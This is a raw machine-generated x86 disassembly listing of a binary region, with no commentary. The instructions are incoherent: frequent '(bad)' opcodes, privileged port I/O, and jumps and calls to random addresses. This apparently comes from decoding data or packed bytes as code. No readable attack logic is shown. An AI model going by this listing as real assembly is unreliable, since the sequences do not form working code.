  402f44:	mov    ch,0xc7
  402f46:	cmp    BYTE PTR [eax-0x7a],bh
  402f49:	xchg   esp,eax
  402f4a:	cmp    DWORD PTR [ebx],ebp
  402f4c:	mov    dh,0x18
  402f4e:	jmp    0xdbb2e7a5
  402f53:	add    dl,bh
  402f55:	out    dx,eax
  402f56:	sbb    dh,BYTE PTR [ecx+ebp*4+0x4f]
  402f5a:	push   ss
  402f5b:	xor    DWORD PTR [esi],edi
  402f5d:	je     0x402f97
  402f5f:	push   es
  402f60:	xor    ah,dh
  402f62:	mov    ds:0xa109f39f,eax
  402f67:	test   eax,0xdec14e26
  402f6c:	xor    ah,BYTE PTR [eax-0x1777d86d]
  402f72:	call   0xca60338a
  402f77:	les    ebp,FWORD PTR [ebp+0x54]
  402f7a:	lds    ebp,FWORD PTR [ebx]
  402f7c:	loopne 0x402fd3
  402f7e:	pop    ecx
  402f7f:	and    BYTE PTR ds:0x8f5f69d4,ch
  402f85:	xchg   DWORD PTR [esi-0x7f9c1794],esp
  402f8b:	(bad)  
  402f8c:	mul    DWORD PTR [esp+ecx*1-0x7c]
  402f90:	ins    BYTE PTR es:[edi],dx
  402f91:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402f93:	les    esi,FWORD PTR [ecx+0x8]
  402f96:	fcom   DWORD PTR [ebx+ecx*2-0x5bf45266]
  402f9d:	addr16 pop ecx
  402f9f:	cdq    
  402fa0:	push   0x4c
  402fa2:	int    0x6
  402fa4:	push   eax
  402fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fa6:	add    BYTE PTR [ebx],al
  402fa8:	fst    DWORD PTR [ebx+edi*8-0x59]
  402fac:	jae    0x402f89
  402fae:	mov    al,0xa4
  402fb0:	rcl    cl,0x3e
  402fb3:	sbb    eax,0xe7b64e69
  402fb8:	push   edx
  402fb9:	jge    0x40300f
  402fbb:	inc    esp
  402fbc:	sbb    al,dl
  402fbe:	pop    ecx
  402fbf:	cmp    edi,edx
  402fc1:	adc    DWORD PTR fs:[esi+esi*1-0x78],edx
  402fc6:	outs   dx,DWORD PTR ds:[esi]
  402fc7:	scas   al,BYTE PTR es:[edi]
  402fc8:	aaa    
  402fc9:	inc    ecx
  402fca:	fild   DWORD PTR [eax+0xf]
  402fcd:	mov    ebx,0xbdd2fc9f
  402fd2:	xchg   esp,eax
  402fd3:	inc    esp
  402fd4:	sub    BYTE PTR [edx+edi*4+0x59],ch
  402fd8:	ret    
  402fd9:	mov    dl,0xbc
  402fdb:	dec    ebp
  402fdc:	jbe    0x402f7a
  402fde:	and    DWORD PTR [eax+0x490604b1],0x18515a65
  402fe8:	and    eax,0x2e4ef7f5
  402fed:	scas   eax,DWORD PTR es:[edi]
  402fee:	pop    edi
  402fef:	add    BYTE PTR [eax],bl
  402ff1:	ret    0x795a
  402ff4:	xlat   BYTE PTR ds:[ebx]
  402ff5:	std    
  402ff6:	data16 xlat BYTE PTR ds:[ebx]
  402ff8:	push   ebp
  402ff9:	fs pop eax
  402ffb:	jne    0x402fe3
  402ffd:	lea    ebp,[ecx+0x74]
  403000:	mov    bl,dh
  403002:	call   0xa6d57fbc
  403007:	mov    DWORD PTR [ebx],ecx
  403009:	repz cld 
  40300b:	pop    eax
  40300c:	(bad)  
  40300d:	mov    ebp,0x6836f0a4
  403012:	mov    WORD PTR [ebx+0x2c],gs
  403015:	push   cs
  403016:	sub    al,0xf1
  403018:	jb     0x402f9a
  40301a:	sti    
  40301b:	push   ebx
  40301c:	dec    eax
  40301d:	ja     0x40304a
  40301f:	retf   
  403020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403021:	out    0x89,eax
  403023:	enter  0x994c,0xe6
  403027:	(bad)  
  403028:	(bad)  
  403029:	cmp    eax,0xc885f326
  40302e:	xor    BYTE PTR [edx-0x49],ch
  403031:	mov    bh,0x8d
  403033:	or     DWORD PTR [ebx],ecx
  403035:	and    bl,dl
  403037:	xchg   ebp,edx
  403039:	pop    esi
  40303a:	test   BYTE PTR [ecx*4+0x2a9eee40],cl
  403041:	daa    
  403042:	xor    bl,BYTE PTR [ecx+ecx*2+0x1d]
  403046:	cmp    DWORD PTR [edi+ebp*4-0xa064460],ebp
  40304d:	mov    DWORD PTR [ecx+edi*2],eax
  403050:	dec    eax
  403051:	push   edi
  403052:	cmp    eax,0x824ad5c
  403057:	test   ebx,0x9170b8e0
  40305d:	jmp    0x4030d8
  40305f:	xchg   BYTE PTR [edx+0x0],dl
  403062:	inc    ebp
  403063:	dec    ebp
  403064:	sbb    al,0xaa
  403066:	in     eax,dx
  403067:	jl     0x4030b5
  403069:	xchg   edi,eax
  40306a:	cmp    eax,0x22721765
  40306f:	lods   al,BYTE PTR ds:[esi]
  403070:	adc    ecx,esi
  403072:	push   ds
  403073:	enter  0xec80,0x8c
  403077:	push   es
  403078:	inc    esi
  403079:	xchg   esp,eax
  40307a:	frstor [ebp+0x64]
  40307d:	aaa    
  40307e:	cmp    DWORD PTR ds:0x986d035c,ecx
  403084:	arpl   WORD PTR [ecx-0x94340a3],ax
  40308a:	jne    0x40302c
  40308c:	mov    BYTE PTR [ecx+ebx*8],0x85
  403090:	hlt    
  403091:	retf   0xde2b
  403094:	xchg   bh,bh
  403096:	fidivr DWORD PTR [esi+0x80242f8]
  40309c:	imul   edx,DWORD PTR [eax-0x64883bdd],0xbf7f5be
  4030a6:	stos   DWORD PTR es:[edi],eax
  4030a7:	xchg   esi,eax
  4030a8:	aam    0xd1
  4030aa:	ja     0x4030f5
  4030ac:	sti    
  4030ad:	cmp    DWORD PTR [ebx+0xe0819e7],ebp
  4030b3:	stos   BYTE PTR es:[edi],al
  4030b4:	arpl   WORD PTR [ecx],sp
  4030b6:	shl    DWORD PTR [ebx],1
  4030b8:	loope  0x40309e
  4030ba:	stos   DWORD PTR es:[edi],eax
  4030bb:	mov    cl,0x97
  4030bd:	mov    ebp,0xc0225c91
  4030c2:	cmc    
  4030c3:	push   ebx
  4030c4:	xchg   ecx,eax
  4030c5:	pop    esp
  4030c6:	aad    0x6e
  4030c8:	call   DWORD PTR [ebx+eiz*1+0xa9ede32]
  4030cf:	push   es
  4030d0:	xor    esi,DWORD PTR [ebp-0x19]
  4030d3:	cmp    BYTE PTR [esi+eiz*2-0x727d5595],bh
  4030da:	xor    eax,0xb4de0d0c
  4030df:	inc    eax
  4030e0:	dec    esi
  4030e1:	adc    al,0x3c
  4030e3:	jle    0x4030f7
  4030e5:	sahf   
  4030e6:	(bad)
  4030e9:	mov    ebx,0x61e247ae
  4030ee:	out    dx,eax
  4030ef:	imul   esi,DWORD PTR [eax-0x28],0x705ee188
  4030f6:	test   DWORD PTR [ecx+0x38e7cdbb],edx
  4030fc:	ret    
  4030fd:	push   ebx
  4030fe:	fcomp  DWORD PTR [ebx-0x432cdc09]
  403104:	dec    edx
  403105:	xchg   DWORD PTR [edi-0x1f25b65e],edx
  40310b:	add    ch,al
  40310d:	call   0xd9128dfa
  403112:	inc    edx
  403113:	and    ebx,DWORD PTR [ecx+0x79]
  403116:	sbb    al,0xf6
  403118:	push   ebp
  403119:	je     0x4030a0
  40311b:	xor    bl,BYTE PTR [edx]
  40311d:	sti    
  40311e:	and    dh,BYTE PTR [edx+esi*2-0x34]
  403122:	sbb    dl,BYTE PTR [esi]
  403124:	loopne 0x40318e
  403126:	mov    ds:0x5dae077f,eax
  40312b:	push   0x905d0637
  403130:	(bad)  
  403131:	sub    cl,ch
  403133:	out    0x56,eax
  403135:	shl    DWORD PTR [edi],1
  403137:	cmp    eax,0x238177af
  40313c:	xchg   ebx,eax
  40313d:	rcr    BYTE PTR [ecx+0x49],cl
  403140:	cwde   
  403141:	(bad)
  403145:	mov    eax,0xe449b98d
  40314a:	pop    ecx
  40314b:	sub    bh,BYTE PTR [ecx]
  40314d:	stos   DWORD PTR es:[edi],eax
  40314e:	in     al,dx
  40314f:	pop    edi
  403150:	scas   al,BYTE PTR es:[edi]
  403151:	jno    0x4030da
  403153:	retf   
  403154:	icebp  
  403155:	adc    eax,0x3cd60623
  40315a:	fiadd  DWORD PTR [ebx]
  40315c:	push   eax
  40315d:	in     al,dx
  40315e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40315f:	and    DWORD PTR [esi],edx
  403161:	push   esi
  403162:	in     al,0x37
  403164:	ret    
  403165:	pop    ecx
  403166:	sahf   
  403167:	pop    edx
  403168:	xchg   esp,eax
  403169:	lahf   
  40316a:	or     esp,ebp
  40316c:	mov    ecx,0x6b472c55
  403171:	add    dh,BYTE PTR ds:0xbe7f2e42
  403177:	sbb    bh,ah
  403179:	and    DWORD PTR [ebx-0x3d],edx
  40317c:	mov    ecx,0x88bb0fa9
  403181:	and    al,0x7f
  403183:	call   0xc2a3:0x8267108b
  40318a:	cwde   
  40318b:	dec    eax
  40318c:	xor    esp,edi
  40318e:	aad    0xad
  403190:	xor    edi,0xffffff83
  403193:	out    0xd5,al
  403195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403196:	mov    dl,0xe5
  403198:	push   ebx
  403199:	loope  0x4031f5
  40319b:	push   ss
  40319c:	jae    0x4031f8
  40319e:	and    al,0x71
  4031a0:	data16 data16 repnz test al,0x36
  4031a5:	jnp    0x4031cd
  4031a7:	xor    ah,dl
  4031a9:	mov    esp,0xfa9d0d73
  4031ae:	sbb    ecx,DWORD PTR [eax]
  4031b0:	adc    ah,BYTE PTR [esi]
  4031b2:	push   ds
  4031b3:	test   DWORD PTR [edx+ecx*4-0x2c],ebx
  4031b7:	test   DWORD PTR [esi],ebp
  4031b9:	imul   eax,DWORD PTR [ebx],0x38
  4031bc:	mov    dl,0xa3
  4031be:	cmp    edx,DWORD PTR ds:0x44aa0b1e
  4031c4:	xchg   ebp,eax
  4031c5:	push   ebx
  4031c6:	sahf   
  4031c7:	push   ecx
  4031c8:	outs   dx,DWORD PTR ds:[esi]
  4031c9:	sbb    BYTE PTR [ecx+0x7cb7ccf3],0x4a
  4031d0:	je     0x403154
  4031d2:	test   al,0x6d
  4031d4:	sbb    eax,0x849a8fc1
  4031d9:	push   ecx
  4031da:	lods   eax,DWORD PTR ds:[esi]
  4031db:	inc    edx
  4031dc:	movntps XMMWORD PTR [eax],xmm7
  4031df:	sub    ecx,DWORD PTR [edx*1+0x3949f1bb]
  4031e6:	(bad)  
  4031e7:	daa    
  4031e8:	or     BYTE PTR [esi-0x60],bh
  4031eb:	add    bh,ch
  4031ed:	(bad)  
  4031ee:	push   0x18
  4031f0:	out    0x39,al
  4031f2:	pop    edx
  4031f3:	test   al,0x7
  4031f5:	push   cs
  4031f6:	or     edx,DWORD PTR [edi]
  4031f8:	jl     0x403238
  4031fa:	fldcw  WORD PTR [edi+0x38]
  4031fd:	out    dx,al
  4031fe:	rol    BYTE PTR ds:0x5361f1a0,1
  403204:	push   es
  403205:	push   cs
  403206:	add    eax,0xee844be2
  40320b:	fiadd  DWORD PTR [edi+esi*8+0x1c0b5362]
  403212:	in     eax,dx
  403213:	mov    BYTE PTR [ebp+0x68b15d6b],dh
  403219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40321a:	sbb    ecx,DWORD PTR [edx+eax*4+0x70]
  40321e:	jo     0x403262
  403220:	out    dx,al
  403221:	stos   DWORD PTR es:[edi],eax
  403222:	shl    DWORD PTR [ecx+0x5d49f2aa],cl
  403228:	inc    ecx
  403229:	(bad)  
  40322a:	cwde   
  40322b:	mov    bl,0x95
  40322d:	push   ebp
  40322e:	shl    BYTE PTR [edx-0x561b238],0x3e
  403235:	(bad)  
  403237:	mov    edx,0x44e21dc1
  40323c:	sub    DWORD PTR [ebx+0x393ab0ff],edx
  403242:	dec    esi
  403243:	mov    ds:0xafab6f8b,al
  403248:	dec    edi
  403249:	mov    ecx,0xdabc05ba
  40324e:	daa    
  40324f:	and    BYTE PTR [edi],dh
  403251:	out    0x13,al
  403253:	inc    esi
  403254:	jle    0x403266
  403256:	jl     0x4031e6
  403258:	scas   al,BYTE PTR es:[edi]
  403259:	mov    BYTE PTR [eax+0x1307a876],dh
  40325f:	jnp    0x40322b
  403261:	xor    BYTE PTR [esi],bh
  403263:	push   ds
  403264:	jmp    0x901f34e2
  403269:	enter  0x64ff,0x87
  40326d:	or     BYTE PTR [ebp-0xa],bh
  403270:	jmp    0x20fc3194
  403275:	sub    eax,DWORD PTR [ecx+0x595f6059]
  40327b:	or     al,0xe0
  40327d:	test   eax,0x3674325a
  403282:	and    al,0x8b
  403284:	jnp    0x40329d
  403286:	cmp    esi,DWORD PTR [ebx-0x429e330e]
  40328c:	xor    BYTE PTR [esi+edx*2],0x58
  403290:	pop    ds
  403291:	pcmpeqw mm3,QWORD PTR [eax+eax*2+0x7a]
  403296:	lahf   
  403297:	rcl    BYTE PTR [edx+0x77],0x90
  40329b:	mov    bl,0x8
  40329d:	mov    WORD PTR ds:0x431c44fd,cs
  4032a3:	adc    al,BYTE PTR ds:0x5893d53f
  4032a9:	or     eax,0xd50b18b2
  4032ae:	inc    ebx
  4032af:	mov    dh,0xe
  4032b1:	cmp    DWORD PTR [eax],eax
  4032b3:	push   esp
  4032b4:	and    ah,BYTE PTR [ebp-0xa]
  4032b7:	pop    eax
  4032b8:	xchg   esp,eax
  4032b9:	js     0x4032c7
  4032bb:	sahf   
  4032bc:	and    eax,0x430a8b18
  4032c1:	add    eax,0x9b132a88
  4032c6:	mov    BYTE PTR [edx],ah
  4032c8:	jbe    0x403339
  4032ca:	mov    bh,0xeb
  4032cc:	lea    esi,[edx-0x19]
  4032cf:	jg     0x4032a9
  4032d1:	cs (bad) 
  4032d3:	cmp    al,0xe5
  4032d5:	out    dx,eax
  4032d6:	adc    eax,0x4973d7d
  4032db:	or     al,0x3c
  4032dd:	push   esp
  4032de:	mov    ds:0x30b77472,eax
  4032e3:	sub    BYTE PTR [edi+0x20],ah
  4032e6:	(bad)  
  4032e8:	xor    ebp,edx
  4032ea:	pop    es
  4032eb:	jns    0x4032d3
  4032ed:	cmp    DWORD PTR [eax-0x1a0a85e],ebx
  4032f3:	call   0xc79cf6f9
  4032f8:	pusha  
  4032f9:	cmp    eax,0x7e9c3dbf
  4032fe:	push   es
  4032ff:	repz stc 
  403301:	cmp    esp,DWORD PTR ds:0x6d7e9471
  403307:	or     al,0x65
  403309:	dec    eax
  40330a:	dec    edi
  40330b:	sbb    eax,eax
  40330d:	push   ss
  40330e:	jns    0x403311
  403310:	jbe    0x403364
  403312:	mov    bl,0x24
  403314:	mov    edi,0x78d217f4
  403319:	int3   
  40331a:	push   ss
  40331b:	fisubr DWORD PTR [ebx+ebp*1]
  40331e:	push   ebp
  40331f:	or     al,0xc6
  403321:	push   cs
  403322:	mov    eax,ds:0xe86ceb65
  403327:	sub    DWORD PTR [eax+ebp*8-0x6383cda],edx
  40332e:	mov    ch,ch
  403330:	pop    esi
  403331:	dec    esi
  403332:	and    bl,0x98
  403335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403336:	mov    ebx,edx
  403338:	test   esi,esi
  40333a:	ret    0x8e86
  40333d:	data16 ss mov dl,0x93
  403341:	xor    eax,0xf0b8591
  403346:	add    BYTE PTR [ecx-0x4b],al
  403349:	scas   al,BYTE PTR es:[edi]
  40334a:	cmp    eax,ebx
  40334c:	or     ch,BYTE PTR [ebx+0x7d454ce5]
  403352:	fidiv  WORD PTR [edi-0x2]
  403355:	mov    ?,ebx
  403357:	dec    edx
  403358:	fstp   st(7)
  40335a:	add    ch,BYTE PTR [ebx]
  40335c:	sahf   
  40335d:	push   es
  40335e:	jmp    DWORD PTR es:0xf1f0a543
  403365:	in     al,0x57
  403367:	les    eax,FWORD PTR [esi+0x25d9a418]
  40336d:	adc    dl,BYTE PTR ds:0x2c5bc536
  403373:	(bad)  
  403374:	loopne 0x4033a2
  403376:	test   al,0x74
  403378:	fst    QWORD PTR cs:[ebx]
  40337b:	mov    ebp,0xafe94fa2
  403380:	push   eax
  403382:	rcl    DWORD PTR [ebp-0x1bc70efe],0x9a
  403389:	cmp    al,0xd0
  40338b:	ins    DWORD PTR es:[edi],dx
  40338c:	mov    edx,0xf7091d46
  403391:	mov    ah,0x6e
  403393:	sub    BYTE PTR [ebx],0x5a
  403396:	aam    0xff
  403398:	dec    esi
  403399:	pop    edi
  40339a:	adc    BYTE PTR [ebp-0x5d],bl
  40339d:	lock rol BYTE PTR [esi-0x7f],cl
  4033a1:	mov    ch,0xe2
  4033a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a4:	or     DWORD PTR [ebp+0x3f],eax
  4033a7:	lods   eax,DWORD PTR ds:[esi]
  4033a8:	xor    ebx,ebp
  4033aa:	xchg   dl,dl
  4033ac:	das    
  4033ad:	mov    gs,edx
  4033af:	push   ebp
  4033b0:	pop    ds
  4033b1:	stos   BYTE PTR es:[edi],al
  4033b2:	test   DWORD PTR [eax+0x51],esi
  4033b5:	cmc    
  4033b6:	mov    ?,WORD PTR [eax-0x6e182f7d]
  4033bc:	das    
  4033bd:	dec    eax
  4033be:	sahf   
  4033bf:	call   0xe2e2da2c
  4033c4:	add    edi,DWORD PTR [ebx+0x49e8316]
  4033ca:	add    al,0x74
  4033cc:	push   ebp
  4033cd:	cmp    al,0xef
  4033cf:	cs mov esp,0x793202ac
  4033d5:	adc    ebp,DWORD PTR [edi]
  4033d7:	lds    esp,FWORD PTR [esi]
  4033d9:	push   0xa
  4033db:	mov    esi,0xbc491b2e
  4033e0:	or     BYTE PTR [esi-0x67],dh
  4033e3:	xchg   eax,eax
  4033e5:	ins    DWORD PTR es:[edi],dx
  4033e6:	cli    
  4033e7:	scas   eax,DWORD PTR es:[edi]
  4033e8:	mov    eax,0x159a2cb8
  4033ed:	inc    edi
  4033ee:	shl    BYTE PTR [ebx-0x16a7dca5],0xe2
  4033f5:	jge    0x4033eb
  4033f7:	fwait
  4033f8:	clc    
  4033f9:	push   edx
  4033fa:	popf   
  4033fb:	push   es
  4033fc:	pusha  
  4033fd:	test   BYTE PTR [edi+0x71b5e0b4],0x31
  403404:	and    DWORD PTR [esi+0x5d],ebp
  403407:	mul    DWORD PTR ds:0xe22dbb54
  40340d:	ret    0x27b3
  403410:	inc    esp
  403411:	xchg   esp,eax
  403412:	(bad)  
  403413:	fidivr DWORD PTR [ebp+0x7d76bc2c]
  403419:	bound  eax,QWORD PTR [edx+eax*8]
  40341c:	dec    edi
  40341d:	or     BYTE PTR [edi+0x43],0x49
  403421:	inc    edi
  403422:	dec    esp
  403423:	repnz fistp WORD PTR [ebx]
  403426:	loop   0x403403
  403428:	aam    0x56
  40342a:	mov    edx,0x1061cb7c
  40342f:	mov    ebp,0xa3612c86
  403434:	inc    BYTE PTR [edx]
  403436:	mov    DWORD PTR [eax],esi
  403438:	xor    DWORD PTR [edi],ecx
  40343a:	bound  esi,QWORD PTR [esi+0xc]
  40343d:	stos   BYTE PTR es:[edi],al
  40343e:	dec    esi
  40343f:	mov    edi,0x6502ed80
  403444:	data16 js 0x4033ef
  403447:	loope  0x403441
  403449:	pop    esi
  40344a:	push   0x8698073c
  40344f:	sti    
  403450:	aaa    
  403451:	xchg   ecx,eax
  403452:	ja     0x4034cb
  403454:	mov    esi,0x3499b1a5
  403459:	retf   
  40345a:	mov    bl,0x5a
  40345c:	aad    0x63
  40345e:	sub    DWORD PTR [edi],ebx
  403460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403461:	mov    ebp,gs
  403463:	icebp  
  403464:	adc    ecx,ebx
  403466:	jb     0x4033e8
  403468:	or     eax,0xb66f4e2
  40346d:	popf   
  40346e:	or     DWORD PTR [edx],edx
  403470:	jb     0x403494
  403472:	push   ds
  403473:	xchg   DWORD PTR [edi-0x37],eax
  403476:	loop   0x403470
  403478:	shl    ebp,cl
  40347a:	sbb    bl,BYTE PTR ss:[esi-0x74334d93]
  403481:	cmp    al,0x25
  403483:	adc    cl,BYTE PTR [edx+0x78]
  403486:	add    eax,0x9d1d5f2e
  40348b:	jle    0x4034c2
  40348d:	or     ch,BYTE PTR [ebx]
  40348f:	inc    ebx
  403490:	sbb    BYTE PTR [ebp+0x35],bl
  403493:	push   ebx
  403494:	or     eax,0x81622827
  403499:	ret    0x3aa5
  40349c:	rol    eax,1
  40349e:	xor    DWORD PTR ds:0x64fc0f63,edi
  4034a4:	push   0xd6152865
  4034a9:	mov    eax,0x6915e19b
  4034ae:	dec    esi
  4034af:	lds    edx,FWORD PTR [esi+0x60e1bbb2]
  4034b5:	out    0x8a,eax
  4034b7:	hlt    
  4034b8:	imul   esp,eax,0xb3ee6608
  4034be:	push   ebx
  4034bf:	adc    BYTE PTR [edi+0x4],ah
  4034c2:	loop   0x403457
  4034c4:	push   ecx
  4034c5:	(bad)  
  4034c6:	xchg   ecx,eax
  4034c7:	xor    al,0xfc
  4034c9:	out    dx,al
  4034ca:	pop    ebx
  4034cb:	rol    BYTE PTR [edi],cl
  4034cd:	in     al,0x66
  4034cf:	ds cs sti 
  4034d2:	sar    BYTE PTR [ecx],1
  4034d4:	hlt    
  4034d5:	or     edx,ebx
  4034d7:	adc    BYTE PTR [ecx],ah
  4034d9:	ror    al,0xa6
  4034dc:	icebp  
  4034dd:	inc    edx
  4034de:	jmp    0xac08:0x3494a55d
  4034e5:	mov    WORD PTR [edx+0x38],?
  4034e8:	and    DWORD PTR ds:0x80fa36b2,esi
  4034ee:	lahf   
  4034ef:	popa   
  4034f0:	push   cs
  4034f1:	inc    esp
  4034f2:	lods   eax,DWORD PTR ds:[esi]
  4034f3:	ret    0x84a3
  4034f6:	ins    DWORD PTR es:[edi],dx
  4034f7:	rcr    DWORD PTR [esi+0xb],1
  4034fa:	cli    
  4034fb:	dec    ebp
  4034fc:	xchg   ebx,eax
  4034fd:	fld    TBYTE PTR [ebx-0x1db409ab]
  403503:	jge    0x4034a6
  403505:	pushf  
  403506:	fidivr DWORD PTR [eax-0x4dba33e7]
  40350c:	sbb    al,0xa6
  40350e:	cmp    al,0xc1
  403510:	sbb    DWORD PTR [edx],ebp
  403512:	mov    WORD PTR [eax],es
  403514:	fiadd  DWORD PTR [eax-0xfb2ea82]
  40351a:	nop
  40351b:	sub    ebx,DWORD PTR [esi+0x1adf174f]
  403521:	fcmovnu st,st(6)
  403523:	rcl    BYTE PTR [eax+0x7ffe73ac],0x79
  40352a:	fwait
  40352b:	sub    edx,eax
  40352d:	in     eax,0xd1
  40352f:	leave  
  403530:	cmp    cl,ch
  403532:	cli    
  403533:	push   ebx
  403534:	mov    ds:0xa6e56748,eax
  403539:	ja     0x4034fe
  40353b:	ss test eax,0x5ec223cd
  403541:	mov    ebp,0xec0f4412
  403546:	jge    0x4035bf
  403548:	sub    edx,DWORD PTR [edx]
  40354a:	loope  0x403521
  40354c:	cmp    DWORD PTR [edx-0x70],esp
  40354f:	add    al,0xfe
  403551:	pop    esp
  403552:	add    al,0x43
  403554:	and    al,0xe7
  403556:	fisubr DWORD PTR [eax-0x1543a327]
  40355c:	ss jge 0x403577
  40355f:	sub    DWORD PTR [edx-0x20],esi
  403562:	cdq    
  403563:	push   esi
  403564:	lods   al,BYTE PTR ds:[esi]
  403565:	leave  
  403566:	mov    edi,0x26d3beae
  40356b:	lock adc dh,BYTE PTR [esi+ebx*1+0x702a3ba3]
  403573:	pop    ebx
  403574:	es cdq 
  403576:	mov    bh,0xa4
  403578:	out    dx,eax
  403579:	mov    ebx,0x32de6395
  40357e:	popf   
  40357f:	fild   DWORD PTR fs:[edx-0x7c]
  403583:	jb     0x4035d8
  403585:	pop    ebx
  403586:	jae    0x4035b9
  403588:	popa   
  403589:	mov    eax,ds:0x40fa12b9
  40358e:	mov    eax,0x1e28272f
  403593:	mov    WORD PTR [eax+0x74],fs
  403596:	mov    ?,WORD PTR [edx]
  403598:	push   es
  403599:	adc    DWORD PTR ds:[ebx-0x1b1a9d0],edx
  4035a0:	mov    BYTE PTR [eax-0x10993aaa],dl
  4035a6:	ja     0x4035b5
  4035a8:	imul   esp,DWORD PTR [edx],0xd4e5fa29
  4035ae:	icebp  
  4035af:	(bad)  
  4035b0:	adc    edi,DWORD PTR [ebx+eax*2]
  4035b3:	or     cl,BYTE PTR [edx]
  4035b5:	add    DWORD PTR [edi],0x21bfd670
  4035bb:	pop    esi
  4035bc:	sbb    bl,BYTE PTR [bx+si+0x8]
  4035c0:	rcr    ebx,0xb3
  4035c3:	daa    
  4035c4:	add    al,al
  4035c6:	popa   
  4035c7:	test   BYTE PTR [esi],bh
  4035c9:	mov    eax,ds:0xb1802437
  4035ce:	cwde   
  4035cf:	pop    ds
  4035d0:	call   0x7d0a:0xbade305c
  4035d7:	or     ch,BYTE PTR [ebx+0x8442bba]
  4035dd:	pop    eax
  4035de:	jns    0x4035c4
  4035e0:	xor    eax,0x361cccc6
  4035e5:	je     0x403591
  4035e7:	(bad)  
  4035e8:	enter  0x5e0c,0xef
  4035ec:	or     DWORD PTR [ebp+0x27983241],eax
  4035f2:	js     0x4035ba
  4035f4:	or     al,0xad
  4035f6:	dec    edx
  4035f7:	xchg   edi,eax
  4035f8:	pop    es
  4035f9:	pinsrw mm3,WORD PTR [ebp+0x6d],0xa9
  4035fe:	push   ebp
  4035ff:	and    al,0xbf
  403601:	dec    edx
  403602:	mov    ch,0x65
  403604:	jb     0x4035d5
  403606:	ror    BYTE PTR [edi],cl
  403608:	les    eax,FWORD PTR [ebp+0x438683ca]
  40360e:	mov    eax,0xe268454
  403613:	jecxz  0x4035dd
  403615:	ins    BYTE PTR es:[edi],dx
  403616:	dec    eax
  403617:	sub    BYTE PTR [ebp+0x16],cl
  40361a:	cmp    eax,0xe37c24ce
  40361f:	jne    0x40368a
  403621:	xchg   ebp,eax
  403622:	push   ds
  403623:	mov    eax,0x4ea00ec2
  403628:	sbb    al,0xf5
  40362a:	int    0xd3
  40362c:	sub    DWORD PTR [eax],edi
  40362e:	jp     0x4035c3
  403630:	lahf   
  403631:	mov    esp,ecx
  403633:	les    esi,FWORD PTR [eax+esi*1]
  403636:	push   0x67eb8696
  40363b:	pop    eax
  40363c:	lea    ebp,[esi+0x493f1ed2]
  403642:	shr    BYTE PTR [ecx],1
  403644:	fs push es
  403646:	(bad)  [edi-0x508011]
  40364c:	push   ecx
  40364d:	bound  ebp,QWORD PTR [ebp+0x3c]
  403650:	rol    bl,cl
  403652:	pop    es
  403653:	xchg   ebx,eax
  403654:	sahf   
  403655:	aaa    
  403656:	lods   al,BYTE PTR ds:[esi]
  403657:	dec    eax
  403658:	in     eax,0x8d
  40365a:	ret    
  40365b:	dec    ecx
  40365c:	in     eax,0xce
  40365e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40365f:	xchg   BYTE PTR [edx-0x4a010f4],cl
  403665:	je     0x403673
  403667:	dec    edx
  403668:	sub    al,0xbf
  40366a:	popf   
  40366b:	add    DWORD PTR [ecx+0xf],eax
  40366e:	retf   0x5d26
  403671:	cwde   
  403672:	add    BYTE PTR [esi],ah
  403674:	pusha  
  403675:	scas   eax,DWORD PTR es:[edi]
  403676:	jmp    0x4036a3
  403678:	or     eax,0xf51ed69a
  40367d:	call   0xbf19:0xdeab5287
  403684:	test   DWORD PTR [edx+0x5795e23e],ebp
  40368a:	push   edi
  40368b:	leave  
  40368c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368d:	fstp   TBYTE PTR [edx]
  40368f:	std    
  403690:	pop    esi
  403691:	cmp    ah,al
  403693:	ret    
  403694:	xchg   DWORD PTR [esi],esi
  403696:	sub    ecx,DWORD PTR [ecx+0x6e]
  403699:	aaa    
  40369a:	dec    ecx
  40369b:	test   BYTE PTR [edi-0x6a],al
  40369e:	(bad)  
  40369f:	xchg   ecx,eax
  4036a0:	adc    DWORD PTR [edi+0x5d],ebp
  4036a3:	imul   edi,esp,0xaad2d960
  4036a9:	leave  
  4036aa:	test   al,0x66
  4036ac:	sub    al,BYTE PTR [esi-0x10]
  4036af:	mov    DWORD PTR [ebx],eax
  4036b1:	sar    DWORD PTR [eax+0x5d],cl
  4036b4:	pop    edi
  4036b5:	jb     0x40363c
  4036b7:	cmp    DWORD PTR [esi+0x73],ebp
  4036ba:	(bad)  
  4036bb:	xor    eax,0xd56fc125
  4036c0:	mov    ebp,0x1ed22a2f
  4036c5:	push   edx
  4036c6:	pop    es
  4036c7:	out    0xdc,eax
  4036c9:	dec    eax
  4036ca:	cmp    bl,BYTE PTR [edx]
  4036cc:	imul   esp,edx,0xec034e4d
  4036d2:	and    al,ch
  4036d4:	sbb    eax,DWORD PTR ds:0x5d8e44df
  4036da:	and    al,BYTE PTR [ecx+0x35]
  4036dd:	push   cs
  4036de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036df:	scas   eax,DWORD PTR es:[edi]
  4036e0:	and    al,0x8
  4036e2:	arpl   di,ax
  4036e4:	jmp    0x4036f3
  4036e6:	inc    ebx
  4036e7:	test   al,0x51
  4036e9:	mov    dh,0x3b
  4036eb:	je     0x4036dd
  4036ed:	inc    esi
  4036ee:	loope  0x403730
  4036f0:	jne    0x40367f
  4036f2:	pop    ebx
  4036f3:	in     eax,dx
  4036f4:	enter  0x8dd0,0x91
  4036f8:	xor    al,0x9c
  4036fa:	jnp    0x403704
  4036fc:	xor    bl,0x83
  4036ff:	es fs inc ebp
  403702:	dec    esi
  403703:	imul   esi,DWORD PTR [esi-0x7544e401],0xffffffee
  40370a:	aam    0x5a
  40370c:	and    DWORD PTR [edx+0xb29fb4c],0xffffff81
  403713:	pop    edx
  403714:	jge    0x403769
  403716:	cmp    edi,DWORD PTR fs:[eax-0x36f79242]
  40371d:	popf   
  40371e:	jae    0x4036f5
  403720:	(bad)  [eax-0x41d9ff76]
